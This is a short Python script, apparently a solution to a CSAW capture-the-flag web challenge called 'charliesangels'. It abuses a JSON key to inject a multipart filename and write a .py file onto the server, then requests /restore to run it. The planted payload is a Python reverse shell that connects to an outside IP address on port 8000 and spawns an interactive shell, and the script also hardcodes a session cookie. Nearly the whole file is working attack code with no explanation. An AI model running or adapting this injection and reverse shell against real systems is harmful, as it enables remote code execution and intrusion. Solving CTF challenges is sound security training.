import requests
# url = "http://localhost:1337"
url = "https://charliesangels.ctf.csaw.io"

s = requests.session() 
sid = "s%3A6sYTAK-OhnHZf4dMbZhEg0fknaq96oSJ.UxbNh90fXTULRj2n8LaXIuW%2BGfjuzOjfLVjM9dZj9a4"
payload = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.180.232.94",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")"""
sessionID = "8VunDrCkIsyni61lXsSMAEMBb6k_XgAu"

r = s.post(
    f"{url}/angel", 
    headers={
        "connect.sid": sid
    },
    json={
        "angel": {
            "name": "test", 
            "actress":"test",
            "movie": "test", 
            "talents": {
                "0":"Intuition",
                "1":"Skiing",
                "2":"Gun Wielding"
            },
        },
        f"file\"; filename=\"{sessionID}.py": payload
    }
)
print(r.text)
r = s.get(
    f"{url}/restore",
    headers={
        "connect.sid": sid
    },
)
print(r.text)